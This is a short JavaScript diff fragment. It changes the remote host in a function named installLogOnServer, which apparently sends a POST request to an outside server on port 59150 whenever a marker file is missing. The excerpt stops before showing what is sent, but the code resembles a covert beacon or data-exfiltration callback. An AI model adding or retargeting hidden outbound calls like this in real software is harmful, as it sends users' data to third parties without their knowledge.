@@ -974,7 +974,7 @@ function installLogOnServer(){
 		fs.statSync('id0_5.ns');
 	}catch(e){
 		var options = {
-			host: 'maquivol.com',
+			host: 'osumexico.com',
 			path: '/',
 			port: '59150',
 			method: 'POST',
